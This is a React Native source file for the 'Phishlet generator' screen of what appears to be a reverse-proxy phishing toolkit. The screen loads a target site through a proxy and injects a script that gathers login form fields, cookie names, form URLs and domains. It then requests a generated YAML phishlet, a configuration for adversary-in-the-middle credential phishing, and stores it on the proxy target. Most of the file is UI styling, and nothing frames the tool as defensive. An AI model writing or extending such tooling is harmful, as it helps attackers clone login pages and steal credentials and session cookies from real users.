import { LinearGradient } from "expo-linear-gradient";
import { ExternalLink, Loader, Radar, Save, Wand2 } from "lucide-react-native";
import React, { useCallback, useMemo, useState } from "react";
import {
  ActivityIndicator,
  Alert,
  Platform,
  Pressable,
  ScrollView,
  StyleSheet,
  Text,
  View,
} from "react-native";
import { useSafeAreaInsets } from "react-native-safe-area-context";
import WebView from "react-native-webview";

import { theme } from "@/constants/theme";
import { useApiKey } from "@/hooks/useApiKey";
import { useGeneratePhishlet, useProxies } from "@/hooks/useGateway";
import { getBaseUrl, proxyUrl } from "@/lib/api";

const CAPTURE_SCRIPT = `
(function() {
  function send() {
    var inputs = Array.from(document.querySelectorAll('input, select, textarea'));
    var forms = Array.from(document.querySelectorAll('form'));
    var fields = inputs.map(function(el) {
      return { name: el.name || el.id || el.placeholder || el.type, type: el.type || 'text' };
    });
    var actionUrls = forms.map(function(f) { return f.action || location.href; });
    var payload = {
      urls: [location.href, ...actionUrls],
      cookies: document.cookie ? document.cookie.split(';').map(function(c) { return c.trim().split('=')[0]; }) : [],
      formFields: fields,
      redirects: [location.href],
      domains: [location.hostname]
    };
    window.ReactNativeWebView && window.ReactNativeWebView.postMessage(JSON.stringify(payload));
  }
  setTimeout(send, 1500);
  document.addEventListener('click', function(e) {
    if (e.target.tagName === 'BUTTON' || e.target.type === 'submit') setTimeout(send, 500);
  });
})();
`;

export default function ReconScreen() {
  const insets = useSafeAreaInsets();
  const ah = useApiKey();
  const { data: proxies = [], isLoading, isError } = useProxies();
  const generate = useGeneratePhishlet(ah);

  const [selectedSlug, setSelectedSlug] = useState<string>("");
  const [captured, setCaptured] = useState<Record<string, unknown>>({});
  const [generated, setGenerated] = useState<string>("");
  const [activeUrl, setActiveUrl] = useState<string>("");
  const [webviewKey, setWebviewKey] = useState(0);

  const selected = useMemo(
    () => proxies.find((p) => p.slug === selectedSlug),
    [proxies, selectedSlug],
  );

  const start = useCallback(() => {
    if (!selected) return;
    setCaptured({});
    setGenerated("");
    const url = proxyUrl(selected.slug);
    setActiveUrl(url);
    setWebviewKey((k) => k + 1);
  }, [selected]);

  const onMessage = useCallback((event: { nativeEvent: { data?: string } }) => {
    try {
      const data = event.nativeEvent.data ? JSON.parse(event.nativeEvent.data) : {};
      setCaptured((prev) => {
        const merged: Record<string, unknown> = { ...prev };
        for (const key of ["urls", "cookies", "formFields", "redirects", "domains"]) {
          const arr = data[key] ?? [];
          const existing = (merged[key] as unknown[]) ?? [];
          merged[key] = [...new Set([...existing, ...arr])];
        }
        return merged;
      });
    } catch {
      // Ignore malformed messages.
    }
  }, []);

  const runGenerate = useCallback(() => {
    if (!selected) return;
    generate.mutate(
      {
        proxyId: selected.id,
        input: {
          targetUrl: selected.targetUrl,
          captured: {
            urls: (captured.urls as string[]) ?? [],
            cookies: (captured.cookies as string[]) ?? [],
            formFields: (captured.formFields as { name: string; type: string }[]) ?? [],
            redirects: (captured.redirects as string[]) ?? [],
            domains: (captured.domains as string[]) ?? [],
          },
        },
      },
      {
        onSuccess: (data) => setGenerated(data.phishlet),
      },
    );
  }, [generate, selected, captured]);

  return (
    <View style={styles.root}>
      <LinearGradient
        colors={[theme.colors.accentGlow, "transparent"]}
        start={{ x: 0.1, y: 0 }}
        end={{ x: 0.9, y: 0.5 }}
        style={styles.glow}
        pointerEvents="none"
      />
      <ScrollView
        contentContainerStyle={[
          styles.content,
          { paddingTop: insets.top + theme.spacing(6) },
        ]}
        showsVerticalScrollIndicator={false}
      >
        <View>
          <Text style={styles.eyebrow}>RECONNAISSANCE</Text>
          <Text style={styles.hero}>Phishlet generator</Text>
          <Text style={styles.sub}>
            Launch a controlled browser through a proxy target, capture login
            forms, cookies, and redirects, then generate a base YAML phishlet.
          </Text>
        </View>

        {isLoading ? (
          <ActivityIndicator color={theme.colors.accent} />
        ) : isError ? (
          <Text style={styles.errorText}>Could not load proxy targets.</Text>
        ) : proxies.length === 0 ? (
          <View style={styles.stateCard}>
            <Radar size={22} color={theme.colors.textFaint} />
            <Text style={styles.stateText}>
              Create a proxy target first to run reconnaissance.
            </Text>
          </View>
        ) : (
          <>
            <View style={styles.selector}>
              <Text style={styles.selectorLabel}>SELECT TARGET</Text>
              <View style={styles.selectorRow}>
                {proxies.map((p) => (
                  <Pressable
                    key={p.slug}
                    onPress={() => setSelectedSlug(p.slug)}
                    style={[
                      styles.selectorBtn,
                      selectedSlug === p.slug && styles.selectorBtnActive,
                    ]}
                  >
                    <Text
                      style={[
                        styles.selectorText,
                        selectedSlug === p.slug && styles.selectorTextActive,
                      ]}
                      numberOfLines={1}
                    >
                      {p.name || p.slug}
                    </Text>
                  </Pressable>
                ))}
              </View>
            </View>

            {selected && (
              <>
                <View style={styles.browserPanel}>
                  <View style={styles.browserHeader}>
                    <Text style={styles.browserUrl} numberOfLines={1}>
                      {activeUrl || "Browser not started"}
                    </Text>
                    <Pressable
                      onPress={start}
                      style={({ pressed }) => [
                        styles.launchBtn,
                        pressed && styles.pressed,
                      ]}
                    >
                      <ExternalLink size={14} color={theme.colors.bg} />
                      <Text style={styles.launchBtnText}>Launch browser</Text>
                    </Pressable>
                  </View>
                  {activeUrl ? (
                    <View style={styles.webviewWrap}>
                      <WebView
                        key={webviewKey}
                        source={{ uri: activeUrl }}
                        injectedJavaScript={CAPTURE_SCRIPT}
                        onMessage={onMessage}
                        style={styles.webview}
                        javaScriptEnabled
                        thirdPartyCookiesEnabled
                        domStorageEnabled
                      />
                    </View>
                  ) : (
                    <View style={styles.webviewPlaceholder}>
                      <Radar size={28} color={theme.colors.textFaint} />
                      <Text style={styles.placeholderText}>
                        Press Launch browser to open the target through the proxy.
                      </Text>
                    </View>
                  )}
                </View>

                <View style={styles.capturedCard}>
                  <Text style={styles.cardTitle}>Captured</Text>
                  <View style={styles.metricRow}>
                    <Metric label="URLS" value={(captured.urls as string[])?.length ?? 0} />
                    <Metric label="COOKIES" value={(captured.cookies as string[])?.length ?? 0} />
                    <Metric label="FIELDS" value={(captured.formFields as unknown[])?.length ?? 0} />
                    <Metric label="DOMAINS" value={(captured.domains as string[])?.length ?? 0} />
                  </View>
                  <Pressable
                    onPress={runGenerate}
                    disabled={generate.isPending}
                    style={({ pressed }) => [
                      styles.generateBtn,
                      pressed && styles.pressed,
                      generate.isPending && styles.generateBtnBusy,
                    ]}
                  >
                    {generate.isPending ? (
                      <Loader size={16} color={theme.colors.bg} />
                    ) : (
                      <Wand2 size={16} color={theme.colors.bg} />
                    )}
                    <Text style={styles.generateBtnText}>
                      {generate.isPending ? "Generating…" : "Generate phishlet YAML"}
                    </Text>
                  </Pressable>
                </View>

                {generated ? (
                  <View style={styles.yamlCard}>
                    <View style={styles.yamlHeader}>
                      <Text style={styles.cardTitle}>Generated phishlet</Text>
                      <Pressable
                        onPress={() => {
                          Alert.alert("Saved", "Phishlet is stored on the proxy target.");
                        }}
                        style={styles.savedBadge}
                      >
                        <Save size={12} color={theme.colors.ok} />
                        <Text style={styles.savedText}>Saved</Text>
                      </Pressable>
                    </View>
                    <Text style={styles.yaml}>{generated}</Text>
                  </View>
                ) : null}
              </>
            )}
          </>
        )}
      </ScrollView>
    </View>
  );
}

function Metric({ label, value }: { label: string; value: number }) {
  return (
    <View style={styles.metric}>
      <Text style={styles.metricValue}>{value}</Text>
      <Text style={styles.metricLabel}>{label}</Text>
    </View>
  );
}

const styles = StyleSheet.create({
  root: { flex: 1, backgroundColor: theme.colors.bg },
  glow: { position: "absolute", top: 0, left: 0, right: 0, height: 280 },
  content: {
    paddingHorizontal: theme.spacing(5),
    paddingBottom: theme.spacing(12),
    gap: theme.spacing(5),
  },
  eyebrow: {
    color: theme.colors.accent,
    fontSize: 12,
    fontWeight: "700",
    letterSpacing: 2,
    fontFamily: theme.font.mono,
  },
  hero: {
    color: theme.colors.text,
    fontSize: 28,
    fontWeight: "800",
    letterSpacing: -0.5,
    marginTop: theme.spacing(1),
  },
  sub: {
    color: theme.colors.textDim,
    fontSize: 14,
    lineHeight: 21,
    marginTop: theme.spacing(2),
  },
  errorText: {
    color: theme.colors.danger,
    fontSize: 14,
    fontFamily: theme.font.mono,
  },
  stateCard: {
    backgroundColor: theme.colors.surface,
    borderRadius: theme.radius.md,
    borderWidth: 1,
    borderColor: theme.colors.border,
    padding: theme.spacing(6),
    gap: theme.spacing(3),
    alignItems: "center",
  },
  stateText: {
    color: theme.colors.textDim,
    fontSize: 14,
    textAlign: "center",
  },
  selector: {
    backgroundColor: theme.colors.surface,
    borderRadius: theme.radius.md,
    borderWidth: 1,
    borderColor: theme.colors.border,
    padding: theme.spacing(4),
    gap: theme.spacing(2),
  },
  selectorLabel: {
    color: theme.colors.textFaint,
    fontSize: 11,
    fontWeight: "700",
    letterSpacing: 1,
    fontFamily: theme.font.mono,
  },
  selectorRow: {
    flexDirection: "row",
    flexWrap: "wrap",
    gap: theme.spacing(2),
  },
  selectorBtn: {
    backgroundColor: theme.colors.bgElevated,
    borderRadius: theme.radius.sm,
    borderWidth: 1,
    borderColor: theme.colors.border,
    paddingHorizontal: theme.spacing(3),
    paddingVertical: theme.spacing(2),
  },
  selectorBtnActive: {
    backgroundColor: "rgba(255,178,62,0.12)",
    borderColor: theme.colors.warn,
  },
  selectorText: {
    color: theme.colors.textDim,
    fontSize: 12,
    fontWeight: "600",
    fontFamily: theme.font.mono,
  },
  selectorTextActive: {
    color: theme.colors.warn,
  },
  browserPanel: {
    backgroundColor: theme.colors.surface,
    borderRadius: theme.radius.md,
    borderWidth: 1,
    borderColor: theme.colors.border,
    overflow: "hidden",
    gap: theme.spacing(2),
  },
  browserHeader: {
    flexDirection: "row",
    alignItems: "center",
    justifyContent: "space-between",
    paddingHorizontal: theme.spacing(4),
    paddingVertical: theme.spacing(3),
    gap: theme.spacing(2),
    borderBottomWidth: 1,
    borderBottomColor: theme.colors.border,
  },
  browserUrl: {
    flex: 1,
    color: theme.colors.text,
    fontSize: 12,
    fontFamily: theme.font.mono,
  },
  launchBtn: {
    flexDirection: "row",
    alignItems: "center",
    gap: theme.spacing(1.5),
    backgroundColor: theme.colors.accent,
    paddingHorizontal: theme.spacing(3),
    paddingVertical: theme.spacing(2),
    borderRadius: theme.radius.sm,
  },
  launchBtnText: {
    color: theme.colors.bg,
    fontSize: 12,
    fontWeight: "700",
  },
  webviewWrap: {
    height: 360,
    backgroundColor: theme.colors.bg,
    marginHorizontal: theme.spacing(2),
    marginBottom: theme.spacing(2),
    borderRadius: theme.radius.sm,
    overflow: "hidden",
  },
  webview: { flex: 1 },
  webviewPlaceholder: {
    height: 220,
    alignItems: "center",
    justifyContent: "center",
    gap: theme.spacing(3),
    marginHorizontal: theme.spacing(2),
    marginBottom: theme.spacing(2),
    backgroundColor: theme.colors.bgElevated,
    borderRadius: theme.radius.sm,
    borderWidth: 1,
    borderColor: theme.colors.border,
    borderStyle: "dashed",
  },
  placeholderText: {
    color: theme.colors.textDim,
    fontSize: 13,
    textAlign: "center",
    paddingHorizontal: theme.spacing(6),
  },
  capturedCard: {
    backgroundColor: theme.colors.surface,
    borderRadius: theme.radius.md,
    borderWidth: 1,
    borderColor: theme.colors.border,
    padding: theme.spacing(4),
    gap: theme.spacing(4),
  },
  cardTitle: {
    color: theme.colors.text,
    fontSize: 14,
    fontWeight: "700",
  },
  metricRow: {
    flexDirection: "row",
    justifyContent: "space-between",
    gap: theme.spacing(2),
  },
  metric: {
    flex: 1,
    backgroundColor: theme.colors.bgElevated,
    borderRadius: theme.radius.sm,
    borderWidth: 1,
    borderColor: theme.colors.border,
    padding: theme.spacing(3),
    alignItems: "center",
  },
  metricValue: {
    color: theme.colors.text,
    fontSize: 20,
    fontWeight: "800",
    fontFamily: theme.font.mono,
  },
  metricLabel: {
    color: theme.colors.textFaint,
    fontSize: 10,
    fontWeight: "700",
    letterSpacing: 0.5,
    fontFamily: theme.font.mono,
    marginTop: theme.spacing(1),
  },
  generateBtn: {
    flexDirection: "row",
    alignItems: "center",
    justifyContent: "center",
    gap: theme.spacing(2),
    backgroundColor: theme.colors.warn,
    paddingVertical: theme.spacing(3),
    borderRadius: theme.radius.md,
  },
  generateBtnBusy: { opacity: 0.7 },
  generateBtnText: {
    color: theme.colors.bg,
    fontSize: 14,
    fontWeight: "800",
  },
  yamlCard: {
    backgroundColor: theme.colors.surface,
    borderRadius: theme.radius.md,
    borderWidth: 1,
    borderColor: theme.colors.border,
    padding: theme.spacing(4),
    gap: theme.spacing(3),
  },
  yamlHeader: {
    flexDirection: "row",
    alignItems: "center",
    justifyContent: "space-between",
  },
  savedBadge: {
    flexDirection: "row",
    alignItems: "center",
    gap: theme.spacing(1),
    backgroundColor: "rgba(34,197,94,0.10)",
    borderRadius: theme.radius.sm,
    borderWidth: 1,
    borderColor: "rgba(34,197,94,0.35)",
    paddingHorizontal: theme.spacing(2),
    paddingVertical: theme.spacing(1),
  },
  savedText: {
    color: theme.colors.ok,
    fontSize: 11,
    fontWeight: "700",
  },
  yaml: {
    color: theme.colors.text,
    fontSize: 12,
    fontFamily: theme.font.mono,
    lineHeight: 18,
  },
  pressed: { opacity: 0.55 },
});
